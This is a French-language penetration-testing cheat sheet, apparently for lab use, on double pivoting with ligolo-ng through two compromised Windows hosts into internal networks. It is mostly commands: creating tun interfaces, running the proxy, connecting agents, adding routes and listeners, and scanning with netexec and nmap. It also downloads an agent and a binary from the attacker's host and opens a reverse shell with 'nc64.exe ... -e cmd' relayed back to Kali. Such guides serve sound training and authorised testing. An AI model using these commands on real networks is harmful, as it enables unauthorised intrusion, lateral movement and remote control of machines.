Dans les commandes suivantes, on a les informations suivantes :
TUN0 IP (Kali VPN):                         192.168.45.156
1st machine EXTERNAL IP:           192.168.1.13
1st machine INTERNAL IP:           10.10.10.10     NOTE: auto-derives 10.10.10.0/24 range

2nd machine EXTERNAL IP:        10.10.10.13
2nd machine INTERNAL IP:        11.11.11.11   NOTE: auto-derives 11.11.11.0/24 range

# 1e pivot

On veut accéder au réseau interne entre la machine 1 et la machine 2

### Creation du tunel n°1 
Disponible :
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8

Sur Kali :
```bash
sudo ip tuntap add user root mode tun tunnel1
sudo ip link set tunnel1 up

sudo ligolo-proxy -selfcert


```
Il faut relever le numéro de port annoncé dans la commande **proxy**

### Connexion de l'agent au proxy

Sur la Machine n°1 , on télécharge l'agent (en exemple une machine windows):
```powershell
iwr -uri http://192.168.45.156/agent.exe -Outfile agent.exe

```
On execute l'agent :
```powershell
.\agent.exe -connect 192.168.45.156:11601 -ignore-cert
```
le port 11601 est donné lors du lancement de .\proxy

ON selectionne l'agent dans Ligolo:
```
session
```

Dans la console "Ligolo" de kali on lance le tunel :
```bash
start --tun tunnel1
```

### Configuration de Kali pour simplifier l'accès au réseau interne :

On ajoute la route vers le sous réseau de la machine1 sur kali :
```bash
sudo ip route add 10.10.10.0/24 dev tunnel1
```

On permet aux nouveaux hôtes d’accéder au proxy pour établir des tunnels (sur Kali).
```bash
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

On peut tester l'accès au réseau interne :
```bash
netexec smb 10.10.10.0/24
```

# 2e pivot

On veut accéder au réseau interne entre la machine2 et le reste (11.11.11.0/24)

### Creation du tunel n°2

Sur Kali :
```bash
sudo ip tuntap add user root mode tun tunnel2
sudo ip link set tunnel2 up

sudo ./proxy -selfcert

```
Il faut relever le numéro de port annoncé dans la commande **proxy**

### Connexion de l'agent au proxy

Sur la Machine n°2 , on télécharge l'agent (en exemple une machine windows):
```powershell
iwr http://192.168.45.156/agent.exe -Outfile agent.exe

```
On execute l'agent :
```powershell
.\agent.exe -connect 10.10.10.10:11601 -ignore-cert
```
le port 11601 est donné lors du lancement de .\proxy

Dans la console "proxy" de kali on lance le tunel :
```bash
start --tun tunnel2
```

### Configuration de Kali pour simplifier l'accès au réseau interne :

On ajoute la route vers le sous réseau de la machine1 sur kali :
```bash
sudo ip route add 11.11.11.0/24 dev tunnel2
```

On permet aux nouveaux hôtes d’accéder au proxy pour établir des tunnels (sur Kali).
```bash
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

Le Téléchargement d'un programme à partir de la machine 2:
```
wget http://10.10.10.10/ph03n1x -outfile ph03n1x
```
On passe donc par la machine 1 pour communiquer avec Kali

On Lance un reverseshell à partir de la machine 2 pour communiquer avec Kali  :
```bash
nc64.exe 10.10.10.10 443 -e cmd
```
Et on sera en connexion avec Kali

On peut tester :
```bash
netexec smb 11.11.11.0/24
```

# Autre Tunnel : Local port forwarding de la machine 1

### Creation du tunnel ligolo

Sur Kali :
```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert

```

### connexion de l'agent au tunnel VPN par exemple
Sur la machine 1 :
```powershell
.\agent.exe -connect 192.168.45.156:11601 -ignore-cert
```

Dans la console "proxy" de kali on lance le tunel :
```bash
start --tun ligolo
```

### Configuration de Kali pour simplifier l'accès au réseau interne :

On ajoute la route vers le sous réseau de la machine1 sur kali :
```bash
sudo ip route add 240.0.0.1/24 dev ligolo
```

### Verification sur Kali
```bash
nmap -p- 240.0.0.1
```
Cette commande nmap va permettre de lister les port auparavant visible que à partir de la machine 1
